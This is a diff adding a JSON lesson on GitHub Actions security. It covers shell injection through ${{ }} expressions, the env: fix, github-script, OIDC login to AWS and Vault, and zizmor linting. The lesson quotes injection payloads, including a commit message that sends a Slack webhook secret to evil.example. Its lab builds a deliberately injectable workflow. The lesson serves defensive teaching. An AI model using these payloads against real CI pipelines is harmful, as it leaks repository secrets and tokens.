@@ -1,0 +1,422 @@
+{
+ "id": "p2-3",
+ "title": "Keeping Actions safe",
+ "minutes": 45,
+ "youNeed": [
+  "p2-1",
+  "p2-2"
+ ],
+ "bridge": "Putting ${{ github.event... }} inside a run: step is like building an SQL string from user input, or like dangerouslySetInnerHTML. Except: the text runs as a shell on a machine that holds your CI secrets. So the attacker gets a token, not a broken page.",
+ "intro": "Workflows hold tokens, cloud roles and Vault access, and agents will soon open PRs that touch them. This lesson shows the one bug that is already in fcp and its fix. Then the JavaScript way with github-script. Then how a job logs in to AWS and Vault without any stored key.",
+ "picture": {
+  "caption": "Attacker text travels inside the event, gets pasted into a shell script by ${{ }}, and runs with the job's secrets. An env variable breaks the chain.",
+  "nodes": [
+   {
+    "id": "attacker",
+    "label": "anyone who can write a commit message",
+    "kind": "person"
+   },
+   {
+    "id": "event",
+    "label": "github.event (the payload)",
+    "kind": "file"
+   },
+   {
+    "id": "wf",
+    "label": "frontend-ci-slack-notify.yml",
+    "kind": "file"
+   },
+   {
+    "id": "shell",
+    "label": "bash on the runner",
+    "kind": "machine"
+   },
+   {
+    "id": "secret",
+    "label": "FRONTEND_SLACK_WEBHOOK_URL",
+    "kind": "file"
+   },
+   {
+    "id": "env",
+    "label": "env: MESSAGE (the fix)",
+    "kind": "check"
+   }
+  ],
+  "steps": [
+   {
+    "from": "attacker",
+    "to": "event",
+    "text": "writes a commit message that contains \"; curl evil.example $SLACK_WEBHOOK; echo \""
+   },
+   {
+    "from": "event",
+    "to": "wf",
+    "text": "the workflow_run event carries that message as head_commit.message"
+   },
+   {
+    "from": "wf",
+    "to": "shell",
+    "text": "${{ github.event.workflow_run.head_commit.message }} is pasted into the run: text before bash starts"
+   },
+   {
+    "from": "shell",
+    "to": "secret",
+    "text": "bash runs the pasted commands with the job's secrets in its environment"
+   },
+   {
+    "from": "env",
+    "to": "shell",
+    "text": "with env:, bash receives the message as a variable's value: data, never code"
+   }
+  ]
+ },
+ "sections": [
+  {
+   "h": "A real bug in fcp",
+   "p": [
+    "Open fcp/.github/workflows/frontend-ci-slack-notify.yml. It runs when '[FRONTEND] - CI' finishes on main and posts the result to Slack. Line 21 takes the commit message from the event and puts it straight into a shell command.",
+    "GitHub replaces every ${{ }} with its value before bash sees the script. So the commit message becomes part of the program, quotes and all. A message with a double quote, a semicolon and a command runs that command, with the Slack webhook in reach."
+   ],
+   "because": "We read the broken step first because you will recognise the shape in every repo you touch: ${{ github.event. ... }} inside run:.",
+   "code": {
+    "lang": "yaml",
+    "file": "fcp/.github/workflows/frontend-ci-slack-notify.yml (lines 16-22, the bug)",
+    "text": "    steps:\n      - name: Extract Commit Summary\n        id: commit_first_line\n        run: |\n          COMMIT_SUMMARY=$(echo \"${{ github.event.workflow_run.head_commit.message }}\" | head -n 1)\n          echo \"commit_summary=$COMMIT_SUMMARY\" >> $GITHUB_ENV",
+    "notes": [
+     {
+      "line": 5,
+      "text": "The expression is expanded into the script text. A message like x\"; id; echo \" turns into echo \"x\"; id; echo \"\" and id runs."
+     },
+     {
+      "line": 5,
+      "text": "This workflow runs from main with main's secrets, so the pasted command runs with FRONTEND_SLACK_WEBHOOK_URL available."
+     },
+     {
+      "line": 6,
+      "text": "$GITHUB_ENV is fine on its own; the problem is only the line above it."
+     }
+    ]
+   },
+   "callout": {
+    "kind": "why",
+    "text": "Who can write a commit message on main? Every engineer, and soon every agent that opens a PR. Trust is not the point; the shell must never see event text as code."
+   }
+  },
+  {
+   "h": "The fix: pass it through env",
+   "p": [
+    "Put the expression in an env: entry and read the variable in the script. bash then receives the text as a value, and a value is never run. Quote the variable, and prefer printf over echo, because echo treats some values as options.",
+    "The same rule holds for every field that a person can type. That means commit messages, PR titles and bodies, branch names, issue comments, review bodies and workflow_dispatch inputs. Fields GitHub sets itself, such as github.sha or github.repository, are safe."
+   ],
+   "because": "We route the value through env because a three-line change removes the whole class of bug, with no new tool.",
+   "code": {
+    "lang": "yaml",
+    "file": "fcp/.github/workflows/frontend-ci-slack-notify.yml (fixed step)",
+    "text": "      - name: Extract Commit Summary\n        env:\n          MESSAGE: ${{ github.event.workflow_run.head_commit.message }}\n        run: |\n          COMMIT_SUMMARY=$(printf '%s\\n' \"$MESSAGE\" | head -n 1)\n          echo \"commit_summary=$COMMIT_SUMMARY\" >> \"$GITHUB_ENV\"",
+    "notes": [
+     {
+      "line": 3,
+      "text": "The expression is still here, but as an environment value. GitHub sets the variable; the script text never changes."
+     },
+     {
+      "line": 5,
+      "text": "printf '%s' prints the value as-is. \"$MESSAGE\" in double quotes keeps spaces and quotes as data."
+     },
+     {
+      "line": 6,
+      "text": "Quoting \"$GITHUB_ENV\" is a habit; the path has no spaces today, but quoting costs nothing."
+     }
+    ]
+   },
+   "see": "On a run with a message that contains \"; echo INJECTED; echo \":\n  commit_summary=\"; echo INJECTED; echo \"  (printed as text, nothing executed)"
+  },
+  {
+   "h": "github-script: JavaScript instead of shell",
+   "p": [
+    "When a step needs the event's fields and the API, write it in JavaScript with actions/github-script. The script gets context (the event, repo and run), github (an Octokit client, lesson p2-5) and core (logging, outputs, failing the step). Event fields are read as context.payload.x in code, so nothing is pasted into source text.",
+    "G5-12's routine trigger is written this way on purpose: no checkout, no ${{ }} inside the script, no PR code runs. It reads the finished run from context.payload and posts its id to the trigger service."
+   ],
+   "because": "We use github-script for anything that mixes event data and API calls. JavaScript reads data as data, and we already write JavaScript.",
+   "code": {
+    "lang": "yaml",
+    "file": "fcp/.github/workflows/ai-agents-routine-trigger.yml (from G5-12)",
+    "text": "    steps:\n      - uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0\n        env:\n          TRIGGER_URL: ${{ vars.AI_AGENTS_TRIGGER_URL }}\n        with:\n          script: |\n            const run = context.payload.workflow_run\n            const token = await core.getIDToken(\"rhino-ai-agents\")\n            const res = await fetch(`${process.env.TRIGGER_URL}/v1/events`, {\n              method: \"POST\",\n              headers: {authorization: `Bearer ${token}`, \"content-type\": \"application/json\"},\n              body: JSON.stringify({kind: \"github.workflow_run\", repo: context.repo.repo, run_id: run.id})\n            })\n            if (!res.ok) core.setFailed(`trigger service answered ${res.status}`)",
+    "notes": [
+     {
+      "line": 2,
+      "text": "Pinned by SHA, as p2-2 taught. The ticket's sketch says @v9 with a note to pin; this is the v9.0.0 hash."
+     },
+     {
+      "line": 4,
+      "text": "A repo variable, read through env, never pasted into the script."
+     },
+     {
+      "line": 7,
+      "text": "The event payload is a JavaScript object here. A hostile branch name is a string value, never code."
+     },
+     {
+      "line": 8,
+      "text": "core.getIDToken asks GitHub for an OIDC token (next section) with the audience rhino-ai-agents."
+     },
+     {
+      "line": 14,
+      "text": "core.setFailed marks the step red with a message. Without it a bad response would pass silently."
+     }
+    ]
+   }
+  },
+  {
+   "h": "OIDC: the job proves who it is, no key stored",
+   "p": [
+    "OIDC for CI is like 'log in with Google'. GitHub signs a short statement, a JWT token, that says: this job runs in repo X, on ref Y, from workflow Z. A JWT is a small JSON object with a signature; each field in it is called a claim.",
+    "AWS or Vault checks the signature and the claims, then hands out temporary credentials. No access key sits in a secret, so there is nothing to leak or rotate.",
+    "The job must ask for it with permissions: id-token: write. An AWS role is an identity a job can borrow for a short time (p3-1 teaches roles). A role's trust policy says which claims it accepts; the sub claim looks like repo:RhinoHealth/fcp:ref:refs/heads/main. For a reusable workflow the job_workflow_ref claim names the called file, so a role can be bound to one workflow.",
+    "fcp's integration tests do this with aws-actions/configure-aws-credentials and the role arn:aws:iam::123456789012:role/GitHubActions. They log in to Vault with hashicorp/vault-action in jwt mode. Vault is the server that holds our secrets; p5-3 teaches it."
+   ],
+   "because": "We use OIDC because every stored cloud key is a secret an agent could print. A token that lives 15 minutes and names the exact job is not.",
+   "code": {
+    "lang": "yaml",
+    "file": "fcp/.github/workflows/_cloud-int-tests-reusable-aws.yml (shortened)",
+    "text": "permissions:\n  id-token: write\n  contents: read\n\njobs:\n  prepare_cloud_environment:\n    runs-on: fcp-runner-set\n    steps:\n      - name: Configure AWS Credentials\n        uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0\n        with:\n          aws-region: ${{ inputs.aws_region }}\n          role-to-assume: ${{ inputs.role_to_assume }}\n          role-duration-seconds: 900\n      - name: Auth to Vault\n        uses: hashicorp/vault-action@892a26828f195e65540a40b4768ae4571f51ebfc # v4.0.0\n        with:\n          method: jwt\n          url: ${{ env.VAULT_ADDRESS }}\n          role: ${{ env.VAULT_ROLE }}\n          exportToken: true",
+    "notes": [
+     {
+      "line": 2,
+      "text": "Without id-token: write, GitHub refuses to mint the OIDC token and the AWS step fails with 'Credentials could not be loaded'."
+     },
+     {
+      "line": 10,
+      "text": "The action trades the OIDC token for AWS credentials and exports them as environment variables for later steps."
+     },
+     {
+      "line": 13,
+      "text": "The role's trust policy decides which repos and refs may assume it. The job cannot pick a role it is not trusted for."
+     },
+     {
+      "line": 14,
+      "text": "Credentials for 15 minutes. Long enough for the step, short enough that a leak is almost worthless."
+     },
+     {
+      "line": 18,
+      "text": "Vault's jwt method does the same trade: GitHub's token in, a Vault token out, scoped by the role's policy."
+     }
+    ]
+   },
+   "callout": {
+    "kind": "wall",
+    "text": "Today Vault's gha-runners role gives the admin policy to any repo:RhinoHealth/* token. Cloud and client CI run on every push with that role. So G0-11 narrows it by job_workflow_ref before any agent pushes to a branch."
+   }
+  },
+  {
+   "h": "Tools that find these bugs for you",
+   "p": [
+    "actionlint checks that a workflow is valid: unknown keys, bad runner labels (it reads .github/actionlint.yaml), wrong expression types. zizmor checks that it is safe. It looks for template injection like the bug above, actions not pinned by hash, too-wide permissions, and checkout steps that keep credentials.",
+    "Both run from uv with no install: uvx actionlint-py and uvx zizmor. G7-28 adds a tiny workflow with both to every repo that has workflows. zizmor starts advisory: it reports but does not fail the job yet."
+   ],
+   "because": "We run zizmor on every change to .github/workflows because a reviewer skims YAML and a linter does not.",
+   "code": {
+    "lang": "bash",
+    "file": "terminal, in any repo with workflows",
+    "text": "uvx --from actionlint-py actionlint -color\nuvx zizmor --min-severity medium .github/workflows\nuvx zizmor --min-severity medium --config .github/zizmor.yml .github/workflows || true",
+    "notes": [
+     {
+      "line": 1,
+      "text": "actionlint-py wraps the actionlint binary for uvx. Pin the version with ==x.y.z in real use, as G7-28 says."
+     },
+     {
+      "line": 2,
+      "text": "Reports findings of medium or higher: template injection, unpinned uses, excessive permissions."
+     },
+     {
+      "line": 3,
+      "text": "The CI form: a config file for the unpinned-uses policy, and || true so it reports without failing the job for now."
+     }
+    ]
+   },
+   "see": "warning[template-injection]: code injection via template expansion\n  --> .github/workflows/frontend-ci-slack-notify.yml:21:11\n   |\n21 |           COMMIT_SUMMARY=$(echo \"${{ github.event.workflow_run.head_commit.message }}\" | head -n 1)\n   |",
+   "ifInstead": "If instead uvx says 'command not found', install uv first (brew install uv) and open a new terminal."
+  },
+  {
+   "h": "Four habits for every workflow",
+   "p": [
+    "Least permissions at the top of the file, always written out. Pin every uses: by hash. Put persist-credentials: false on checkout unless a later step must push, so the token does not sit in .git/config for every step. And never run code from a PR with secrets: pull_request_target with a checkout of the PR's head is the classic mistake.",
+    "Comment-triggered workflows deserve a second look: byte-review.yml runs on issue_comment, which is text anyone in the org can write. It is safe today because it only reads the comment in an if: expression and never in a shell. G7-28 asks you to check those first."
+   ],
+   "callout": {
+    "kind": "tip",
+    "text": "A fast review question for any step: can text that a person typed reach a shell as code, or reach a token? If yes, move it to env or to github-script."
+   }
+  }
+ ],
+ "lab": {
+  "title": "Inject yourself, fix it, then read an OIDC token",
+  "youNeed": [
+   "actions-lab from p2-1",
+   "gh CLI",
+   "uv (brew install uv)"
+  ],
+  "worked": [
+   {
+    "do": "In actions-lab create .github/workflows/inject.yml: on workflow_dispatch with input name (string); permissions contents: read; one job on ubuntu-latest with the step run: echo \"Hello ${{ inputs.name }}\"",
+    "see": "(file saved)"
+   },
+   {
+    "do": "git add -A && git commit -m 'Injectable step on purpose' && git push",
+    "see": "main -> main"
+   },
+   {
+    "do": "gh workflow run inject.yml -f 'name=x\"; echo INJECTED; echo \"' && sleep 8 && gh run watch",
+    "see": "✓ inject"
+   },
+   {
+    "do": "gh run view --log | grep -E 'Hello|INJECTED'",
+    "see": "... Hello x\n... INJECTED\n(the input ran a command of its own)"
+   },
+   {
+    "do": "uvx zizmor --min-severity medium .github/workflows",
+    "see": "warning[template-injection]: code injection via template expansion\n  --> .github/workflows/inject.yml"
+   },
+   {
+    "do": "Change the step to env: NAME: ${{ inputs.name }} and run: echo \"Hello $NAME\". Commit, push, and run it again with the same -f value.",
+    "see": "... Hello x\"; echo INJECTED; echo \"   (one line, nothing executed)"
+   },
+   {
+    "do": "uvx zizmor --min-severity medium .github/workflows",
+    "see": "No findings (or only findings about other files)"
+   },
+   {
+    "do": "Create .github/workflows/whoami.yml: workflow_dispatch; permissions id-token: write, contents: read; a github-script step (pinned to the v9.0.0 hash) with script: const t = await core.getIDToken(); const c = JSON.parse(Buffer.from(t.split('.')[1], 'base64url')); core.info(JSON.stringify({repository: c.repository, ref: c.ref, job_workflow_ref: c.job_workflow_ref}))",
+    "see": "(file saved)"
+   },
+   {
+    "do": "git add -A && git commit -m 'Print OIDC claims' && git push && gh workflow run whoami.yml && sleep 8 && gh run view --log | grep repository",
+    "see": "{\"repository\":\"seanazu/actions-lab\",\"ref\":\"refs/heads/main\",\"job_workflow_ref\":\"seanazu/actions-lab/.github/workflows/whoami.yml@refs/heads/main\"}"
+   }
+  ],
+  "faded": "Copy frontend-ci-slack-notify.yml from fcp into actions-lab (do not push it to fcp). Run zizmor on it, and apply the env: fix from the lesson. Run zizmor again: the template-injection finding must be gone. The exact env: and run: lines of the fix are yours to write.",
+  "alone": "In your fcp checkout, run grep -rn 'run:' -A3 .github/workflows | grep '\\${{ github.event' and read every hit. For each one write one line: safe (why) or injectable (which field a person types). Do not change fcp; the fix for the Slack file belongs to a ticket.",
+  "done": "You saw INJECTED appear from an input and made it disappear with env:. You printed the repository, ref and job_workflow_ref claims of a real OIDC token."
+ },
+ "quiz": [
+  {
+   "q": "Which of these inside run: is a script injection?",
+   "options": [
+    {
+     "text": "echo \"${{ github.sha }}\"",
+     "correct": false,
+     "why": "github.sha is set by GitHub and is always 40 hex characters; a person cannot put shell text in it."
+    },
+    {
+     "text": "echo \"${{ github.event.pull_request.title }}\"",
+     "correct": true,
+     "why": "A PR title is typed by a person and is pasted into the script before bash runs. Move it to env:."
+    },
+    {
+     "text": "echo \"$PR_TITLE\" with env: PR_TITLE: ${{ github.event.pull_request.title }}",
+     "correct": false,
+     "why": "Through env: the title arrives as a value. bash never parses a value as code."
+    }
+   ]
+  },
+  {
+   "q": "A job assumes an AWS role with OIDC. Where is the AWS access key stored?",
+   "options": [
+    {
+     "text": "In a repo secret named AWS_ACCESS_KEY_ID.",
+     "correct": false,
+     "why": "That is the old way, and what OIDC removes. A stored key can be printed by any step."
+    },
+    {
+     "text": "Nowhere. GitHub signs a token about the job and AWS trades it for 15-minute credentials.",
+     "correct": true,
+     "why": "The role's trust policy names which repo and ref may do this. There is no long-lived key anywhere."
+    },
+    {
+     "text": "In Vault, fetched by vault-action first.",
+     "correct": false,
+     "why": "Vault is also logged into with the same OIDC token. Neither step needs a stored key."
+    }
+   ]
+  },
+  {
+   "q": "What does job_workflow_ref in the OIDC token let you do?",
+   "options": [
+    {
+     "text": "Bind a Vault or AWS role to one reusable workflow file instead of any workflow in the org.",
+     "correct": true,
+     "why": "G0-11 uses it to narrow the gha-runners role that today trusts any repo:RhinoHealth/* token."
+    },
+    {
+     "text": "Skip id-token: write, because the claim is public.",
+     "correct": false,
+     "why": "The permission is still needed to mint the token at all."
+    },
+    {
+     "text": "Let the job run workflow_dispatch on another repo.",
+     "correct": false,
+     "why": "OIDC proves identity to outside systems; it grants nothing inside GitHub, and agents never dispatch anyway."
+    }
+   ]
+  }
+ ],
+ "recall": [
+  "From p2-2: what are the only four things that cross between a caller and a reusable workflow?",
+  "From p1-4: why do we compare secrets with timingSafeEqual instead of ===?"
+ ],
+ "videos": [
+  {
+   "title": "avoiding shell injection in github actions (intermediate) anthony explains #479",
+   "url": "https://www.youtube.com/watch?v=7w0Ns8C1shQ",
+   "channel": "anthonywritescode",
+   "minutes": 4,
+   "why": "Four-minute demo of script injection and the env-variable fix."
+  },
+  {
+   "title": "Securely deploy to AWS with GitHub Actions and OIDC",
+   "url": "https://www.youtube.com/watch?v=Io5UFJlEJKc",
+   "channel": "GitHub",
+   "minutes": 17,
+   "why": "Official GitHub walkthrough of OIDC to AWS with no stored secrets."
+  }
+ ],
+ "words": [
+  {
+   "term": "script injection",
+   "plain": "Text a person typed (a title, a commit message) pasted into a run: script by ${{ }}, so it runs as commands."
+  },
+  {
+   "term": "github-script",
+   "plain": "The actions/github-script action: a step written in JavaScript with context, github and core objects."
+  },
+  {
+   "term": "OIDC token",
+   "plain": "A signed statement from GitHub that says which repo, ref and workflow a job runs in. AWS and Vault trade it for short-lived credentials."
+  },
+  {
+   "term": "trust policy",
+   "plain": "The rule on an AWS role that says which OIDC claims (repo, ref, workflow) may assume it."
+  },
+  {
+   "term": "claim",
+   "plain": "One field inside the OIDC token, such as repository, ref or job_workflow_ref."
+  },
+  {
+   "term": "zizmor",
+   "plain": "A linter that finds unsafe patterns in workflows: injection, unpinned actions, wide permissions."
+  }
+ ],
+ "tickets": [
+  {
+   "key": "G5-12",
+   "why": "The routine trigger is a github-script step that reads context.payload and sends an OIDC token. You now know why no ${{ }} appears inside it."
+  },
+  {
+   "key": "G7-28",
+   "why": "Adding actionlint and zizmor to every repo needs you to read their findings and know which ones are real."
+  },
+  {
+   "key": "G1-03",
+   "why": "The nightly metrics job logs in to AWS with the GitHubActions OIDC role to write to VictoriaMetrics."
+  }
+ ],
+ "remember": "Typed text goes through env: or github-script, never into a run: script. Jobs prove who they are with OIDC instead of holding a key."
+}
